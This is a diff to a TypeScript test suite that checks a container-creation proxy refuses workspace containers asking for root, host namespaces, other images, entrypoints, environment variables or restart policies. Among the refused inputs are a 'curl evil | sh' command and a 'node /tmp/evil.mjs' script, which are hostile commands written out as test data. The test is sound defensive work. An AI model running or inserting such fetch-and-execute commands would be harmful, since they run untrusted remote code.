@@ -217,7 +217,7 @@ test("a workspace container is refused when it asks for anything a workspace is 
     ["a user namespace mode", good(A, {}, { UsernsMode: "host" }), "user namespace"],
     ["root", good(A, { User: "0:0" }), "10001"],
     ["no user", good(A, { User: "" }), "10001"],
-    ["another command", good(A, { Cmd: ["sh", "-c", "curl evil | sh"] }), "sleep infinity"],
+    ["another command", good(A, { Cmd: ["sh", "-c", "curl evil | sh"] }), "job supervisor"],
     ["another image", good(A, { Image: "alpine:latest" }), "image"],
     ["the agent computer image", good(A, { Image: "vyre/agent-computer:1" }), "image"],
     ["another label", good(A, { Labels: { "vyre.workspace": A, "com.docker.compose.service": "vyred" } }), "label"],
@@ -227,6 +227,8 @@ test("a workspace container is refused when it asks for anything a workspace is 
     ["an environment variable of its own", good(A, { Env: ["SECRET=1"] }), "environment"],
     ["another agent's id in the environment", good(A, { Env: [`VYRE_WORKSPACE_AGENT=${B}`] }), "environment"],
     ["another entrypoint", good(A, { Entrypoint: ["/bin/sh"] }), "Entrypoint"],
+    ["the supervisor with another script", good(A, { Cmd: ["node", "/tmp/evil.mjs"] }), "job supervisor"],
+    ["a restart policy of always", good(A, {}, { RestartPolicy: { Name: "always" } }), "unless-stopped"],
   ];
   for (const [what, body, why] of refused) {
     const r = await create(body);
@@ -236,6 +238,11 @@ test("a workspace container is refused when it asks for anything a workspace is 
   assert.equal((await create(good(), "vyred")).status, 403, "a name that is not a workspace's");
   assert.equal((await create(good(), name(B))).status, 403, "the name of another agent's workspace");
   assert.equal(w.seen.filter((s) => s.url.includes("/containers/create")).length, 0, "nothing refused reached Docker");
+  // the job supervisor of the image, and a restart after a reboot unless it was stopped on purpose (rc.44), are what a workspace is made with now; the old `sleep infinity` still passes for one made before
+  const sup = await create(
+    good(A, { Cmd: ["node", "/opt/vyre/supervisor.mjs"] }, { RestartPolicy: { Name: "unless-stopped" } }),
+  );
+  assert.equal(sup.status, 201, sup.body);
   const ok = await create(good());
   assert.equal(ok.status, 201, ok.body);
   const sent = JSON.parse(w.seen.at(-1)!.body) as { HostConfig: Record<string, unknown> };
